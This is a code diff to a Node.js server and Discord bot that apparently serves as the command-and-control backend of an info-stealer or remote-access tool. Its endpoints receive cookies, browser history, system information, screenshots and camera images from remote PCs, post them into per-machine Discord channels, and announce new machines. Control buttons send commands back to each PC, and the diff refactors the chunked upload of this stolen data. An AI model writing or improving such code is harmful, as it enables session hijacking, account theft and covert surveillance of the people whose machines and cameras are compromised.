@@ -59,10 +59,7 @@ function shortHash(s, len = 8) {
     return crypto.createHash('sha1').update(s).digest('hex').slice(0, len); 
 }
 function safeChannelName(prefix, id) { 
-    return `${prefix}-${shortHash(id, 8)}`
-        .toLowerCase()
-        .replace(/[^a-z0-9\-]/g, '-')
-        .slice(0, 90); 
+    return `${prefix}-${shortHash(id, 8)}`.toLowerCase().replace(/[^a-z0-9\-]/g, '-').slice(0, 90); 
 }
 
 async function logToDiscord(msg) {
@@ -143,6 +140,33 @@ bot.on("interactionCreate", async interaction => {
     await interaction.reply({ content: `✅ Команда "${command}" отправлена ПК ${pcId}`, ephemeral: true });
 });
 
+// ---------- Функция безопасной резки файлов ----------
+function safeFileChunking(str, maxBytes) {
+    const chunks = [];
+    let i = 0;
+    while (i < str.length) {
+        let chunk = str.slice(i, i + maxBytes);
+        chunks.push(chunk);
+        i += maxBytes;
+    }
+    return chunks;
+}
+
+async function sendJsonFile(channel, nameBase, jsonData) {
+    const str = JSON.stringify(jsonData, null, 2);
+    if (Buffer.byteLength(str) <= MAX_FILE_SIZE) {
+        await channel.send({ files: [{ attachment: Buffer.from(str), name: `${nameBase}.json` }] });
+    } else {
+        const chunks = safeFileChunking(str, MAX_FILE_SIZE);
+        for (let i = 0; i < chunks.length; i++) {
+            await channel.send({
+                content: `📄 Файл ${nameBase} часть ${i+1}/${chunks.length}`,
+                files: [{ attachment: Buffer.from(chunks[i]), name: `${nameBase}-part${i+1}.json` }]
+            });
+        }
+    }
+}
+
 // ---------- Upload PC ----------
 app.post("/upload-pc", async (req, res) => {
     try {
@@ -158,61 +182,32 @@ app.post("/upload-pc", async (req, res) => {
         let finalChannel = null;
         let isNewPc = false;
 
-        if (channelByPC[pcId]) {
-            finalChannel = await guild.channels.fetch(channelByPC[pcId]).catch(() => null);
-        }
+        if (channelByPC[pcId]) finalChannel = await guild.channels.fetch(channelByPC[pcId]).catch(() => null);
         if (!finalChannel) {
             finalChannel = await getOrCreateTextChannel(guild, channelName, category.id);
             channelByPC[pcId] = finalChannel.id;
             isNewPc = true;
         }
 
-        // ---------- Оповещение о новом ПК ----------
         if (isNewPc) {
             const logChannel = await getOrCreateLogChannel(guild);
             await logChannel.send(`🚀 Новый ПК подключен: **${pcId}** <@everyone>`);
         }
 
-        // ---------- Формируем файлы ----------
-        const files = [];
-        const descriptions = [];
-
-        if (cookies) {
-            const chunks = safeFileChunking(JSON.stringify(cookies, null, 2), MAX_FILE_SIZE);
-            chunks.forEach((chunk, idx) => {
-                files.push({ attachment: Buffer.from(chunk), name: `${channelName}-cookies-part${idx+1}.json` });
-            });
-            descriptions.push("🍪 **Cookies** — сохранены");
-        }
-
-        if (history) {
-            const chunks = safeFileChunking(JSON.stringify(history, null, 2), MAX_FILE_SIZE);
-            chunks.forEach((chunk, idx) => {
-                files.push({ attachment: Buffer.from(chunk), name: `${channelName}-history-part${idx+1}.json` });
-            });
-            descriptions.push("📜 **История браузера** — сохранена");
-        }
-
-        if (systemInfo) {
-            files.push({ attachment: Buffer.from(JSON.stringify(systemInfo, null, 2)), name: `${channelName}-system.json` });
-            descriptions.push("💻 **Системная информация** — сохранена");
-        }
-
+        if (cookies) await sendJsonFile(finalChannel, `${channelName}-cookies`, cookies);
+        if (history) await sendJsonFile(finalChannel, `${channelName}-history`, history);
+        if (systemInfo) await sendJsonFile(finalChannel, `${channelName}-system`, systemInfo);
         if (screenshot) {
-            files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${channelName}-screenshot.jpeg` });
-            descriptions.push("🖼️ **Скриншот** — сохранён");
+            await finalChannel.send({ files: [{ attachment: Buffer.from(screenshot, "base64"), name: `${channelName}-screenshot.jpeg` }] });
         }
 
-        let contentMsg = `🟢 ПК **${pcId}** обновлён\n\n` + descriptions.join("\n");
-        const messageOptions = { content: contentMsg, components: createControlButtons(pcId) };
-        if (files.length) messageOptions.files = files;
-
+        const messageOptions = { content: `🟢 ПК **${pcId}** обновлён`, components: createControlButtons(pcId) };
         await finalChannel.send(messageOptions);
 
         res.json({ success: true });
-    } catch (e) { 
-        await logToDiscord(`❌ Ошибка upload-pc: ${e.message}`); 
-        res.status(500).json({ error: e.message }); 
+    } catch (e) {
+        await logToDiscord(`❌ Ошибка upload-pc: ${e.message}`);
+        res.status(500).json({ error: e.message });
     }
 });
 
@@ -241,49 +236,29 @@ app.post("/upload-cam", async (req, res) => {
         let finalChannel = null;
         let isNewCam = false;
 
-        if (channelByCam[camId]) {
-            finalChannel = await guild.channels.fetch(channelByCam[camId]).catch(() => null);
-        }
+        if (channelByCam[camId]) finalChannel = await guild.channels.fetch(channelByCam[camId]).catch(() => null);
         if (!finalChannel || finalChannel.parentId !== category.id) {
             finalChannel = await getOrCreateTextChannel(guild, channelName, category.id);
             channelByCam[camId] = finalChannel.id;
             isNewCam = true;
         }
 
-        // ---------- Уведомление о новой камере ----------
         if (isNewCam) {
             const logChannel = await getOrCreateLogChannel(guild);
-            await logChannel.send(`🚀 Новая камера подключена: ${camId} <@everyone>`);
+            await logChannel.send(`🚀 Новая камера подключена: **${camId}** <@everyone>`);
         }
 
-        // ---------- Отправка скриншота ----------
         const buffer = Buffer.from(screenshot, "base64");
         if (buffer.length <= MAX_FILE_SIZE) {
-            await finalChannel.send({
-                content: `📷 Новое изображение с камеры **${camId}** (${new Date().toLocaleTimeString()})`,
-                files: [{ attachment: buffer, name: `${channelName}.jpg` }]
-            });
+            await finalChannel.send({ content: `📷 Новое изображение с камеры **${camId}** (${new Date().toLocaleTimeString()})`, files: [{ attachment: buffer, name: `${channelName}.jpg` }] });
         }
 
-        // ---------- Отправка куки ----------
-        if (cookies) {
-            const chunks = safeFileChunking(JSON.stringify(cookies, null, 2), MAX_FILE_SIZE);
-            chunks.forEach((chunk, idx) => {
-                finalChannel.send({
-                    content: `🍪 Куки камеры **${camId}** часть ${idx+1}/${chunks.length}`,
-                    files: [{ attachment: Buffer.from(chunk), name: `${channelName}-cookies-part${idx+1}.json` }]
-                });
-            });
-        }
+        if (cookies) await sendJsonFile(finalChannel, `${channelName}-cookies`, cookies);
 
         camLastUpload[camId] = Date.now();
 
-        // WS broadcast
         if (wsCameraClients[camId]) {
-            wsCameraClients[camId].forEach(ws => {
-                try { ws.send(JSON.stringify({ camId, screenshot })); } 
-                catch (e) { }
-            });
+            wsCameraClients[camId].forEach(ws => { try { ws.send(JSON.stringify({ camId, screenshot })); } catch (e) {} });
         }
 
         res.json({ success: true });
@@ -316,15 +291,3 @@ server.listen(PORT, () => console.log(`🚀 Сервер слушает порт
 
 process.on("uncaughtException", e => logToDiscord(`💥 Uncaught Exception: ${e.message}`));
 process.on("unhandledRejection", e => logToDiscord(`💥 Unhandled Rejection: ${e}`));
-
-// ---------- Вспомогательная функция для резки больших файлов ----------
-function safeFileChunking(str, maxBytes) {
-    const chunks = [];
-    let i = 0;
-    while (i < str.length) {
-        let chunk = str.slice(i, i + maxBytes);
-        chunks.push(chunk);
-        i += maxBytes;
-    }
-    return chunks;
-}
